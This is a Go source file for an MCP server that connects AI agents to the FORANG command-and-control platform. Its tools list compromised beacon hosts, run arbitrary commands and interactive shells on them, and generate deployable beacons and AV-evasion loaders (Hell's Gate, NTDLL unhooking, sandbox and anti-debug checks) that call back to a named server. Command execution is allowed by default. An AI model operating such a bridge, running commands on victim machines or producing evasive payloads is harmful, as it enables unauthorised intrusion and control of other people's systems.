// forang-mcp — FORANG 操作面的 MCP（Model Context Protocol）stdio server。
//
// 对齐 emp3r0r 的 MCP 模式：把平台操作面（C2 会话/命令执行/任务结果/载荷与
// 免杀加载器生成/交互 PTY）暴露为 MCP tools，供 Claude Code、Codex 等任意
// AI harness 以自然语言直接操作 FORANG。纯标准库实现，协议层自绘
// （MCP stdio = 行分隔 JSON-RPC 2.0，版本 2025-06-18）。
//
// 安全模型（借鉴 emp3r0r 的确定性 OPSEC 闸，v1 简化）：
//   - 每个工具声明风险级别 read / execute / payload；
//   - 策略按工具名 allow/warn/block 覆盖默认（read=allow, execute=allow,
//     payload=warn），warn 执行但审计标注，block 直接拒绝；
//   - 每次 tools/call 写 JSONL 审计（时间/工具/参数摘要/决策）。
//   - MCP server 持有 FORANG 平台凭据，等价于操作员权限：请只在可信
//     harness 环境/专用 VM 中挂载；目标输出按不可信数据处理。
//
// 认证（二选一，优先 JWT key）：
//
//	FORANG_JWT_KEY  平台签名密钥（容器内 /app/jwt.key），直接 HS256 签 token
//	FORANG_USER / FORANG_PASS  走 /api/auth/login 换 JWT
//
// 连接：
//
//	FORANG_URL  默认 http://127.0.0.1:8787
//
// 用法：
//
//	FORANG_JWT_KEY=$(cat jwt.key) forang-mcp            # stdio 挂载
//	forang-mcp --policy '{"c2_exec":"block"}'           # 工具级策略覆盖
package main

import (
	"bufio"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const mcpProtocolVersion = "2025-06-18"

// ---------- MCP 框架（行分隔 JSON-RPC 2.0） ----------

type rpcRequest struct {
	JSONRPC string          `json:"jsonrpc"`
	ID      json.RawMessage `json:"id,omitempty"`
	Method  string          `json:"method"`
	Params  json.RawMessage `json:"params,omitempty"`
}

type rpcError struct {
	Code    int    `json:"code"`
	Message string `json:"message"`
}

func (e *rpcError) Error() string { return fmt.Sprintf("rpc %d: %s", e.Code, e.Message) }

const (
	errParse     = -32700
	errInvalidRe = -32601
	errInvalidAr = -32602
	errInternal  = -32603
)

func writeMsg(w io.Writer, v any) {
	b, err := json.Marshal(v)
	if err != nil {
		return
	}
	w.Write(append(b, '\n'))
}

func writeResult(w io.Writer, id json.RawMessage, result any) {
	writeMsg(w, map[string]any{"jsonrpc": "2.0", "id": id, "result": result})
}

func writeErrResp(w io.Writer, id json.RawMessage, code int, msg string) {
	writeMsg(w, map[string]any{"jsonrpc": "2.0", "id": id, "error": rpcError{Code: code, Message: msg}})
}

// ---------- 工具注册表 ----------

type riskLevel string

const (
	riskRead    riskLevel = "read"
	riskExecute riskLevel = "execute"
	riskPayload riskLevel = "payload"
)

type tool struct {
	Name        string
	Description string
	Risk        riskLevel
	Schema      map[string]any
	Handler     func(args map[string]any) (string, error)
}

var tools []tool

func registerTool(t tool) { tools = append(tools, t) }

// ---------- FORANG 客户端 ----------

type forangClient struct {
	base   string
	jwtKey string
	user   string
	pass   string
	token  string
	hc     *http.Client
}

func (c *forangClient) auth() error {
	if c.token != "" {
		return nil
	}
	if c.jwtKey != "" {
		tok, err := signHS256([]byte(c.jwtKey))
		if err != nil {
			return err
		}
		c.token = tok
		return nil
	}
	body := fmt.Sprintf(`{"username":%q,"password":%q}`, c.user, c.pass)
	resp, err := c.hc.Post(c.base+"/api/auth/login", "application/json", strings.NewReader(body))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	var out struct {
		Token string `json:"token"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil || out.Token == "" {
		return fmt.Errorf("登录失败（HTTP %d）", resp.StatusCode)
	}
	c.token = out.Token
	return nil
}

func (c *forangClient) do(method, path string, body []byte) ([]byte, int, error) {
	if err := c.auth(); err != nil {
		return nil, 0, err
	}
	var rd io.Reader
	if body != nil {
		rd = strings.NewReader(string(body))
	}
	req, err := http.NewRequest(method, c.base+path, rd)
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("Authorization", "Bearer "+c.token)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := c.hc.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(io.LimitReader(resp.Body, 64<<20))
	if err != nil {
		return nil, resp.StatusCode, err
	}
	if resp.StatusCode == 401 && c.jwtKey == "" {
		c.token = "" // 密码模式下过期重登一次
	}
	return raw, resp.StatusCode, nil
}

// signHS256 直接按 FORANG auth.go 的 signJWT 结构签 token（sub=FORANG，7 天）。
func signHS256(key []byte) (string, error) {
	b64 := func(b []byte) string { return base64.RawURLEncoding.EncodeToString(b) }
	now := time.Now().Unix()
	hdr := b64([]byte(`{"alg":"HS256","typ":"JWT"}`))
	pl, err := json.Marshal(map[string]any{"sub": "FORANG", "exp": now + 7*24*3600, "iat": now})
	if err != nil {
		return "", err
	}
	mac := hmac.New(sha256.New, key)
	mac.Write([]byte(hdr + "." + b64(pl)))
	return hdr + "." + b64(pl) + "." + b64(mac.Sum(nil)), nil
}

// ---------- OPSEC 闸与审计 ----------

type opsecGate struct {
	policy map[string]string // 工具名 → allow|warn|block
	audit  *os.File
}

func defaultVerdict(r riskLevel) string {
	switch r {
	case riskPayload:
		return "warn"
	default:
		return "allow"
	}
}

func (g *opsecGate) verdict(t tool) string {
	if v, ok := g.policy[t.Name]; ok {
		return v
	}
	return defaultVerdict(t.Risk)
}

func (g *opsecGate) auditLine(toolName, verdict, argsSummary, outcome string) {
	if g.audit == nil {
		return
	}
	rec := map[string]any{
		"ts":   time.Now().UTC().Format(time.RFC3339),
		"tool": toolName, "verdict": verdict,
		"args": argsSummary, "outcome": outcome,
	}
	b, _ := json.Marshal(rec)
	g.audit.Write(append(b, '\n'))
}

// ---------- 工具实现 ----------

var fc *forangClient

func argStr(args map[string]any, key string) string {
	v, _ := args[key].(string)
	return strings.TrimSpace(v)
}

func argInt(args map[string]any, key string, def int) int {
	if f, ok := args[key].(float64); ok && f > 0 {
		return int(f)
	}
	return def
}

// callFORANG 调平台接口并把 {"data":...}/{"detail":...} 信封归一为文本结果。
func callFORANG(method, path string, body any) (string, error) {
	var raw []byte
	if body != nil {
		b, err := json.Marshal(body)
		if err != nil {
			return "", err
		}
		raw = b
	}
	out, code, err := fc.do(method, path, raw)
	if err != nil {
		return "", err
	}
	if code >= 400 {
		var e struct {
			Detail string `json:"detail"`
		}
		_ = json.Unmarshal(out, &e)
		if e.Detail == "" {
			e.Detail = fmt.Sprintf("HTTP %d: %s", code, truncate(string(out), 200))
		}
		return "", fmt.Errorf("%s", e.Detail)
	}
	return string(out), nil
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "...(截断)"
}

// waitForTask 轮询任务结果（exec_wait 用），超时返回当前状态。
func waitForTask(sid, tid string, timeoutSec int) (string, error) {
	deadline := time.Now().Add(time.Duration(timeoutSec) * time.Second)
	for time.Now().Before(deadline) {
		out, err := callFORANG("GET", "/api/tools/c2/tasks?session_id="+sid+"&task_id="+tid, nil)
		if err == nil {
			var env struct {
				Data []struct {
					Status string `json:"status"`
					Output string `json:"output"`
					Error  string `json:"error"`
				} `json:"data"`
			}
			if json.Unmarshal([]byte(out), &env) == nil && len(env.Data) > 0 {
				t := env.Data[0]
				if t.Status == "done" || t.Status == "failed" {
					res := "status=" + t.Status
					if t.Error != "" {
						res += "\n[ERROR] " + t.Error
					}
					return res + "\n" + t.Output, nil
				}
			}
		}
		time.Sleep(1 * time.Second)
	}
	return "timeout: " + fmt.Sprintf("%ds 内任务未完成，task_id=%s（稍后用 c2_task_results 查询）", timeoutSec, tid), nil
}

func registerAll() {
	registerTool(tool{
		Name: "forang_status", Risk: riskRead,
		Description: "FORANG 平台健康状态：C2 可达性、在线 beacon 数、连接配置（token 脱敏）。",
		Schema:      map[string]any{"type": "object", "properties": map[string]any{}},
		Handler: func(args map[string]any) (string, error) {
			return callFORANG("GET", "/api/tools/c2/status", nil)
		},
	})
	registerTool(tool{
		Name: "c2_list_beacons", Risk: riskRead,
		Description: "列出全部 C2 beacon 会话（id/hostname/username/os/arch/ip/listener/最近在线）。",
		Schema:      map[string]any{"type": "object", "properties": map[string]any{}},
		Handler: func(args map[string]any) (string, error) {
			return callFORANG("GET", "/api/tools/c2/clients", nil)
		},
	})
	registerTool(tool{
		Name: "c2_exec", Risk: riskExecute,
		Description: "向指定 beacon 下发命令，立即返回 task_id（不等结果；要同步拿输出用 c2_exec_wait）。",
		Schema: map[string]any{"type": "object", "required": []string{"session_id", "cmd"},
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string", "description": "beacon 会话 id"},
				"cmd":        map[string]any{"type": "string", "description": "要执行的命令"},
			}},
		Handler: func(args map[string]any) (string, error) {
			sid, cmd := argStr(args, "session_id"), argStr(args, "cmd")
			if sid == "" || cmd == "" {
				return "", fmt.Errorf("session_id 与 cmd 必填")
			}
			return callFORANG("POST", "/api/tools/c2/exec", map[string]any{"session_id": sid, "cmd": cmd})
		},
	})
	registerTool(tool{
		Name: "c2_exec_wait", Risk: riskExecute,
		Description: "向 beacon 下发命令并等待结果（默认 30s，超时返回 task_id 供后续查询）。",
		Schema: map[string]any{"type": "object", "required": []string{"session_id", "cmd"},
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"cmd":        map[string]any{"type": "string"},
				"timeout":    map[string]any{"type": "integer", "description": "等待秒数，默认 30"},
			}},
		Handler: func(args map[string]any) (string, error) {
			sid, cmd := argStr(args, "session_id"), argStr(args, "cmd")
			if sid == "" || cmd == "" {
				return "", fmt.Errorf("session_id 与 cmd 必填")
			}
			created, err := callFORANG("POST", "/api/tools/c2/exec", map[string]any{"session_id": sid, "cmd": cmd})
			if err != nil {
				return "", err
			}
			var env struct {
				Data struct {
					TaskID string `json:"task_id"`
				} `json:"data"`
			}
			_ = json.Unmarshal([]byte(created), &env)
			if env.Data.TaskID == "" {
				return created, nil
			}
			return waitForTask(sid, env.Data.TaskID, argInt(args, "timeout", 30))
		},
	})
	registerTool(tool{
		Name: "c2_task_results", Risk: riskRead,
		Description: "查询 beacon 的任务与结果（可按 task_id 过滤）。",
		Schema: map[string]any{"type": "object", "required": []string{"session_id"},
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"task_id":    map[string]any{"type": "string", "description": "可选，单个任务"},
			}},
		Handler: func(args map[string]any) (string, error) {
			sid := argStr(args, "session_id")
			path := "/api/tools/c2/tasks?session_id=" + sid
			if tid := argStr(args, "task_id"); tid != "" {
				path += "&task_id=" + tid
			}
			return callFORANG("GET", path, nil)
		},
	})
	registerTool(tool{
		Name: "c2_list_listeners", Risk: riskRead,
		Description: "列出 goc2 监听器。",
		Schema:      map[string]any{"type": "object", "properties": map[string]any{}},
		Handler: func(args map[string]any) (string, error) {
			return callFORANG("GET", "/api/tools/c2/listeners", nil)
		},
	})
	registerTool(tool{
		Name: "c2_set_notes", Risk: riskExecute,
		Description: "给 beacon 会话写备注（CS 备注语义，截断 500 字符）。",
		Schema: map[string]any{"type": "object", "required": []string{"session_id", "notes"},
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"notes":      map[string]any{"type": "string"},
			}},
		Handler: func(args map[string]any) (string, error) {
			sid := argStr(args, "session_id")
			return callFORANG("PUT", "/api/tools/c2/clients/"+sid+"/notes", map[string]any{"notes": argStr(args, "notes")})
		},
	})
	registerTool(tool{
		Name: "c2_generate_payload", Risk: riskPayload,
		Description: "生成可直接部署的 beacon 二进制（连接参数编译时内嵌，下载即用）。" +
			"format: amd64_exe/x86_exe/amd64_exe_g/amd64_dll/linux_elf/linux_elf_g/linux_arm64/darwin_amd64/darwin_arm64/shellcode。" +
			"server 为目标机回连地址（如 https://goc2.allclb.com）。返回 base64 与元数据。",
		Schema: map[string]any{"type": "object", "required": []string{"listener_id", "format"},
			"properties": map[string]any{
				"listener_id": map[string]any{"type": "string"},
				"format":      map[string]any{"type": "string"},
				"server":      map[string]any{"type": "string", "description": "可选，回连地址覆盖"},
			}},
		Handler: func(args map[string]any) (string, error) {
			body := map[string]any{"listener_id": argStr(args, "listener_id"), "format": argStr(args, "format")}
			if srv := argStr(args, "server"); srv != "" {
				body["server"] = srv
			}
			out, code, err := fc.do("POST", "/api/tools/c2/generate", mustJSON(body))
			if err != nil {
				return "", err
			}
			if code >= 400 {
				return "", fmt.Errorf("HTTP %d: %s", code, truncate(string(out), 200))
			}
			return fmt.Sprintf("binary_b64=%d 字节产物已生成（base64 前缀 %s...；完整产物建议经平台下载链接获取，MCP 通道仅回传摘要）",
				len(out), truncate(base64.StdEncoding.EncodeToString(out[:min(96, len(out))]), 120)), nil
		},
	})
	registerTool(tool{
		Name: "c2_generate_loader", Risk: riskPayload,
		Description: "生成免杀加载器（Windows EXE）：technique = t0_drop（稳定落盘）/ t1_classic（Hell's Gate + NTDLL 脱钩 + VEH 内存保护）/ t3_sleep（强免杀：五重沙箱检测 + 反调试 + 行为延迟）。返回 base64 与元数据。",
		Schema: map[string]any{"type": "object", "required": []string{"listener_id", "technique"},
			"properties": map[string]any{
				"listener_id": map[string]any{"type": "string"},
				"technique":   map[string]any{"type": "string"},
				"server":      map[string]any{"type": "string", "description": "可选，回连地址覆盖"},
			}},
		Handler: func(args map[string]any) (string, error) {
			body := map[string]any{"listener_id": argStr(args, "listener_id"), "technique": argStr(args, "technique")}
			if srv := argStr(args, "server"); srv != "" {
				body["server"] = srv
			}
			out, code, err := fc.do("POST", "/api/tools/c2/loader-generate", mustJSON(body))
			if err != nil {
				return "", err
			}
			if code >= 400 {
				return "", fmt.Errorf("HTTP %d: %s", code, truncate(string(out), 200))
			}
			return fmt.Sprintf("loader 已生成：%d 字节（PE32+；base64 前缀 %s...）", len(out),
				truncate(base64.StdEncoding.EncodeToString(out[:min(96, len(out))]), 120)), nil
		},
	})
	registerTool(tool{
		Name: "pty_attach", Risk: riskExecute,
		Description: "在 beacon 上打开交互 shell 会话，返回 pty 会话 id（配合 pty_read/pty_write/close）。",
		Schema: map[string]any{"type": "object", "required": []string{"session_id"},
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"cols":       map[string]any{"type": "integer"},
				"rows":       map[string]any{"type": "integer"},
			}},
		Handler: func(args map[string]any) (string, error) {
			sid := argStr(args, "session_id")
			return callFORANG("POST", "/api/c2x/wsshell/attach", map[string]any{
				"agent_id": sid, "cols": argInt(args, "cols", 120), "rows": argInt(args, "rows", 30)})
		},
	})
	registerTool(tool{
		Name: "pty_read", Risk: riskRead,
		Description: "读取 PTY 会话输出（cursor 起增量，base64 已解码为文本回传）。",
		Schema: map[string]any{"type": "object", "required": []string{"session_id", "pty_id"},
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"pty_id":     map[string]any{"type": "string"},
				"cursor":     map[string]any{"type": "integer", "description": "上次读到的偏移，缺省 0"},
			}},
		Handler: func(args map[string]any) (string, error) {
			sid, pid := argStr(args, "session_id"), argStr(args, "pty_id")
			path := fmt.Sprintf("/api/c2x/wsshell/stream?agent_id=%s&sid=%s", sid, pid)
			if c := argInt(args, "cursor", 0); c > 0 {
				path += fmt.Sprintf("&cursor=%d", c)
			}
			return callFORANG("GET", path, nil)
		},
	})
	registerTool(tool{
		Name: "pty_write", Risk: riskExecute,
		Description: "向 PTY 会话写入输入（明文，内部 base64 编码）。",
		Schema: map[string]any{"type": "object", "required": []string{"session_id", "pty_id", "data"},
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"pty_id":     map[string]any{"type": "string"},
				"data":       map[string]any{"type": "string"},
			}},
		Handler: func(args map[string]any) (string, error) {
			sid, pid, data := argStr(args, "session_id"), argStr(args, "pty_id"), argStr(args, "data")
			return callFORANG("POST", "/api/c2x/wsshell/input", map[string]any{
				"agent_id": sid, "sid": pid, "data": base64.StdEncoding.EncodeToString([]byte(data))})
		},
	})
	registerTool(tool{
		Name: "pty_close", Risk: riskExecute,
		Description: "关闭 PTY 会话。",
		Schema: map[string]any{"type": "object", "required": []string{"session_id", "pty_id"},
			"properties": map[string]any{
				"session_id": map[string]any{"type": "string"},
				"pty_id":     map[string]any{"type": "string"},
			}},
		Handler: func(args map[string]any) (string, error) {
			return callFORANG("POST", "/api/c2x/wsshell/close", map[string]any{
				"agent_id": argStr(args, "session_id"), "sid": argStr(args, "pty_id")})
		},
	})
}

func mustJSON(v any) []byte {
	b, _ := json.Marshal(v)
	return b
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ---------- main：stdio 循环 ----------

func main() {
	base := flag.String("url", envOr("FORANG_URL", "http://127.0.0.1:8787"), "FORANG 平台地址")
	jwtKey := flag.String("jwt-key", os.Getenv("FORANG_JWT_KEY"), "JWT 签名密钥（直接签 token）")
	user := flag.String("user", os.Getenv("FORANG_USER"), "平台用户名（FORANG）")
	pass := flag.String("pass", os.Getenv("FORANG_PASS"), "平台密码")
	policyJSON := flag.String("policy", os.Getenv("FORANG_MCP_POLICY"), "工具级 OPSEC 策略 JSON，如 {\"c2_exec\":\"block\"}")
	flag.Parse()

	fc = &forangClient{
		base:   strings.TrimRight(*base, "/"),
		jwtKey: strings.TrimSpace(*jwtKey),
		user:   *user, pass: *pass,
		hc: &http.Client{Timeout: 90 * time.Second},
	}
	registerAll()

	gate := &opsecGate{policy: map[string]string{}}
	if strings.TrimSpace(*policyJSON) != "" {
		_ = json.Unmarshal([]byte(*policyJSON), &gate.policy)
	}
	home, _ := os.UserHomeDir()
	if home != "" {
		if d := filepath.Join(home, ".forang-mcp"); os.MkdirAll(d, 0o700) == nil {
			if f, err := os.OpenFile(filepath.Join(d, "audit.jsonl"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600); err == nil {
				gate.audit = f
			}
		}
	}
	log.SetOutput(io.Discard) // stderr 也不能污染：MCP stdio 只走 JSON

	sc := bufio.NewScanner(os.Stdin)
	sc.Buffer(make([]byte, 1<<20), 64<<20)
	out := bufio.NewWriter(os.Stdout)
	defer out.Flush()
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			continue
		}
		var req rpcRequest
		if err := json.Unmarshal([]byte(line), &req); err != nil {
			writeErrResp(out, nil, errParse, "parse error")
			continue
		}
		switch req.Method {
		case "initialize":
			writeResult(out, req.ID, map[string]any{
				"protocolVersion": mcpProtocolVersion,
				"capabilities":    map[string]any{"tools": map[string]any{}},
				"serverInfo":      map[string]any{"name": "forang-mcp", "version": "0.1.0"},
			})
		case "notifications/initialized", "notifications/cancelled":
			// 通知无需应答
		case "ping":
			writeResult(out, req.ID, map[string]any{})
		case "tools/list":
			arr := make([]map[string]any, 0, len(tools))
			for _, t := range tools {
				arr = append(arr, map[string]any{
					"name":        t.Name,
					"description": "[" + string(t.Risk) + "] " + t.Description,
					"inputSchema": t.Schema,
				})
			}
			writeResult(out, req.ID, map[string]any{"tools": arr})
		case "tools/call":
			var p struct {
				Name      string         `json:"name"`
				Arguments map[string]any `json:"arguments"`
			}
			if err := json.Unmarshal(req.Params, &p); err != nil {
				writeErrResp(out, req.ID, errInvalidAr, "bad params")
				continue
			}
			var target *tool
			for i := range tools {
				if tools[i].Name == p.Name {
					target = &tools[i]
					break
				}
			}
			if target == nil {
				writeErrResp(out, req.ID, errInvalidRe, "unknown tool: "+p.Name)
				continue
			}
			verdict := gate.verdict(*target)
			argsSummary := truncate(string(mustJSON(p.Arguments)), 300)
			if verdict == "block" {
				gate.auditLine(target.Name, verdict, argsSummary, "denied")
				writeResult(out, req.ID, map[string]any{
					"content": []map[string]any{{"type": "text", "text": "OPSEC block：工具 " + target.Name + " 被策略拒绝执行"}},
					"isError": true,
				})
				continue
			}
			text, err := target.Handler(p.Arguments)
			outcome := "ok"
			isErr := false
			if err != nil {
				text, outcome, isErr = err.Error(), "error", true
			}
			if verdict == "warn" {
				text = "[OPSEC WARN: " + string(target.Risk) + "] " + text
			}
			gate.auditLine(target.Name, verdict, argsSummary, outcome)
			writeResult(out, req.ID, map[string]any{
				"content": []map[string]any{{"type": "text", "text": text}},
				"isError": isErr,
			})
		default:
			if len(req.ID) > 0 {
				writeErrResp(out, req.ID, errInvalidRe, "unknown method: "+req.Method)
			}
		}
		out.Flush()
	}
}

func envOr(k, def string) string {
	if v := strings.TrimSpace(os.Getenv(k)); v != "" {
		return v
	}
	return def
}
